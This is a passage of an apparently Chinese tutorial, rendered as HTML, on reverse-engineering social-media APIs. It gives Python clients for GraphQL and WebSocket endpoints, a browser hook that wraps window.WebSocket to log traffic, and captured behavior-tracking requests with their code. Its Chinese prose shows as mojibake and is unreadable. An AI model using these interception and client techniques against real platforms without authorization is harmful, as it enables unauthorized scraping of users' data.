    <span class="k">def</span><span class="w"> </span><span class="nf">get_user_posts</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">first</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ç”¨æˆ·å¸–å­&quot;&quot;&quot;</span>
        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        query UserTimeline($userId: ID!, $first: Int!) {</span>
<span class="s2">          user(id: $userId) {</span>
<span class="s2">            posts(first: $first) {</span>
<span class="s2">              edges {</span>
<span class="s2">                node {</span>
<span class="s2">                  id</span>
<span class="s2">                  text</span>
<span class="s2">                  created_at</span>
<span class="s2">                  likes {</span>
<span class="s2">                    count</span>
<span class="s2">                  }</span>
<span class="s2">                  comments {</span>
<span class="s2">                    count</span>
<span class="s2">                  }</span>
<span class="s2">                }</span>
<span class="s2">              }</span>
<span class="s2">            }</span>
<span class="s2">          }</span>
<span class="s2">        }</span>
<span class="s2">        &quot;&quot;&quot;</span>

        <span class="n">variables</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;userId&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
            <span class="s1">&#39;first&#39;</span><span class="p">:</span> <span class="n">first</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">variables</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">GraphQLClient</span><span class="p">(</span>
    <span class="n">endpoint</span><span class="o">=</span><span class="s1">&#39;https://example.com/graphql&#39;</span><span class="p">,</span>
    <span class="n">token</span><span class="o">=</span><span class="s1">&#39;YOUR_TOKEN_HERE&#39;</span>
<span class="p">)</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_user_posts</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="s1">&#39;12345&#39;</span><span class="p">,</span> <span class="n">first</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span>

<span class="c1"># è§£æç»“æœ</span>
<span class="n">posts</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;posts&#39;</span><span class="p">][</span><span class="s1">&#39;edges&#39;</span><span class="p">]</span>
<span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">posts</span><span class="p">:</span>
    <span class="n">post</span> <span class="o">=</span> <span class="n">edge</span><span class="p">[</span><span class="s1">&#39;node&#39;</span><span class="p">]</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Likes: </span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;likes&#39;</span><span class="p">][</span><span class="s1">&#39;count&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">, Comments: </span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;comments&#39;</span><span class="p">][</span><span class="s1">&#39;count&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹å››å®æ—¶é€šçŸ¥ä¸-websocket">æ¡ˆä¾‹å››ï¼šå®æ—¶é€šçŸ¥ä¸ WebSocket</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>ç¤¾äº¤åª’ä½“çš„å®æ—¶é€šçŸ¥ï¼ˆæ–°æ¶ˆæ¯ã€ç‚¹èµã€è¯„è®ºï¼‰é€šå¸¸ä½¿ç”¨ WebSocketï¼š</p>

      <ul>
        <li>åŒå‘é€šä¿¡</li>
        <li>æœåŠ¡å™¨ä¸»åŠ¨æ¨é€</li>
        <li>ä¿æŒé•¿è¿æ¥</li>
      </ul>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-4">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-è§‚å¯Ÿ-websocket-è¿æ¥">1. è§‚å¯Ÿ WebSocket è¿æ¥</h4>

      <p>åœ¨ Network é¢æ¿çš„ WS æ ‡ç­¾ä¸­æŸ¥çœ‹ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¿æ¥å»ºç«‹</span>
<span class="nx">ws</span><span class="o">:</span><span class="c1">//example.com/ws?token=abc123&amp;userId=12345</span>

<span class="c1">// æ¥æ”¶æ¶ˆæ¯</span>
<span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;notification&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="s2">&quot;id&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;notify_123&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;like&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="s2">&quot;from_user&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;user_456&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="s2">&quot;post_id&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;post_789&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="s2">&quot;timestamp&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1702800000</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// å‘é€æ¶ˆæ¯ï¼ˆå¿ƒè·³ï¼‰</span>
<span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;ping&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;timestamp&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1702800000</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-hook-websocket">2. Hook WebSocket</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook WebSocket æ„é€ å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WebSocket] Connecting to:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Hook onmessage</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalOnMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WebSocket] Received:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">originalOnMessage</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">originalOnMessage</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook send</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WebSocket] Sending:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSend</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">ws</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°-websocket-å®¢æˆ·ç«¯">3. Python å®ç° WebSocket å®¢æˆ·ç«¯</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">websocket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">SocialMediaWS</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">token</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="n">user_id</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å›è°ƒ&quot;&quot;&quot;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[Received] </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;notification&#39;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">handle_notification</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é”™è¯¯å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[Error] </span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_close</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">close_status_code</span><span class="p">,</span> <span class="n">close_msg</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å…³é—­å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[Closed] Code: </span><span class="si">{</span><span class="n">close_status_code</span><span class="si">}</span><span class="s1">, Message: </span><span class="si">{</span><span class="n">close_msg</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥å»ºç«‹å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[Connected]&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>

        <span class="c1"># å¯åŠ¨å¿ƒè·³çº¿ç¨‹</span>
        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">send_heartbeat</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send_heartbeat</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€å¿ƒè·³&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="p">:</span>
                <span class="n">ping_msg</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
                    <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;ping&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
                <span class="p">})</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ping_msg</span><span class="p">)</span>
                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[Heartbeat] Sent&#39;</span><span class="p">)</span>

            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>  <span class="c1"># æ¯30ç§’ä¸€æ¬¡</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">handle_notification</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†é€šçŸ¥&quot;&quot;&quot;</span>
        <span class="n">notif_type</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">notif_type</span> <span class="o">==</span> <span class="s1">&#39;like&#39;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;from_user&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> liked your post </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">notif_type</span> <span class="o">==</span> <span class="s1">&#39;comment&#39;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;from_user&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> commented on your post&quot;</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">notif_type</span> <span class="o">==</span> <span class="s1">&#39;follow&#39;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;from_user&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> followed you&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å»ºç«‹è¿æ¥&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;ws://example.com/ws?token=</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&amp;userId=</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&quot;</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketApp</span><span class="p">(</span>
            <span class="n">url</span><span class="p">,</span>
            <span class="n">on_open</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_open</span><span class="p">,</span>
            <span class="n">on_message</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_message</span><span class="p">,</span>
            <span class="n">on_error</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_error</span><span class="p">,</span>
            <span class="n">on_close</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_close</span>
        <span class="p">)</span>

        <span class="c1"># è¿è¡Œï¼ˆé˜»å¡ï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">run_forever</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">disconnect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ–­å¼€è¿æ¥&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">ws_client</span> <span class="o">=</span> <span class="n">SocialMediaWS</span><span class="p">(</span><span class="n">token</span><span class="o">=</span><span class="s1">&#39;YOUR_TOKEN&#39;</span><span class="p">,</span> <span class="n">user_id</span><span class="o">=</span><span class="s1">&#39;12345&#39;</span><span class="p">)</span>
<span class="n">ws_client</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>  <span class="c1"># é˜»å¡è¿è¡Œ</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹äº”æ¨èç®—æ³•å‚æ•°é€†å‘">æ¡ˆä¾‹äº”ï¼šæ¨èç®—æ³•å‚æ•°é€†å‘</h2>

      <h3 id="èƒŒæ™¯-5">èƒŒæ™¯</h3>

      <p>ç¤¾äº¤åª’ä½“çš„æ¨èç®—æ³•ä¼šæ ¹æ®ç”¨æˆ·è¡Œä¸ºè°ƒæ•´å†…å®¹ï¼š</p>

      <ul>
        <li>ç‚¹èµã€è¯„è®ºã€åˆ†äº«</li>
        <li>åœç•™æ—¶é—´</li>
        <li>æ»šåŠ¨é€Ÿåº¦</li>
        <li>äº¤äº’é¢‘ç‡</li>
      </ul>

      <p>è¿™äº›æ•°æ®é€šè¿‡ API å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-5">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æè¡Œä¸ºä¸ŠæŠ¥">1. æŠ“åŒ…åˆ†æè¡Œä¸ºä¸ŠæŠ¥</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/behavior</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>

<span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;session_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sess_123&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;events&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;view&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;post_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post_789&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">5.2</span><span class="p">,</span><span class="w">  </span><span class="c1">// åœç•™æ—¶é—´ï¼ˆç§’ï¼‰</span>
<span class="w">            </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702800000</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;like&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;post_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post_789&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702800005</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;share&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;post_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post_789&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wechat&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702800010</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-å®šä½è¡Œä¸ºè¿½è¸ªä»£ç ">2. å®šä½è¡Œä¸ºè¿½è¸ªä»£ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¿½è¸ªå¸–å­æµè§ˆ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">observer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">IntersectionObserver</span><span class="p">((</span><span class="nx">entries</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entries</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">entry</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">entry</span><span class="p">.</span><span class="nx">isIntersecting</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">postId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">entry</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">dataset</span><span class="p">.</span><span class="nx">postId</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">viewStart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>

<span class="w">            </span><span class="c1">// è®°å½•å¼€å§‹æ—¶é—´</span>
<span class="w">            </span><span class="nx">viewTimers</span><span class="p">[</span><span class="nx">postId</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">viewStart</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">postId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">entry</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">dataset</span><span class="p">.</span><span class="nx">postId</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">viewTimers</span><span class="p">[</span><span class="nx">postId</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">duration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">viewTimers</span><span class="p">[</span><span class="nx">postId</span><span class="p">])</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>

<span class="w">                </span><span class="c1">// ä¸ŠæŠ¥æµè§ˆäº‹ä»¶</span>
<span class="w">                </span><span class="nx">trackEvent</span><span class="p">({</span>
<span class="w">                    </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;view&#39;</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">post_id</span><span class="o">:</span><span class="w"> </span><span class="nx">postId</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">duration</span><span class="o">:</span><span class="w"> </span><span class="nx">duration</span>
<span class="w">                </span><span class="p">});</span>

<span class="w">                </span><span class="ow">delete</span><span class="w"> </span><span class="nx">viewTimers</span><span class="p">[</span><span class="nx">postId</span><span class="p">];</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>

<span class="c1">// ç›‘å¬æ‰€æœ‰å¸–å­</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;.post&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">post</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">observer</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// è¿½è¸ªç‚¹èµ</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">handleLike</span><span class="p">(</span><span class="nx">postId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">trackEvent</span><span class="p">({</span>
<span class="w">        </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;like&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">post_id</span><span class="o">:</span><span class="w"> </span><span class="nx">postId</span><span class="p">,</span>
<span class="w">        </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// å®é™…çš„ç‚¹èµè¯·æ±‚</span>
<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/like&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">post_id</span><span class="o">:</span><span class="w"> </span><span class="nx">postId</span><span class="w"> </span><span class="p">})</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

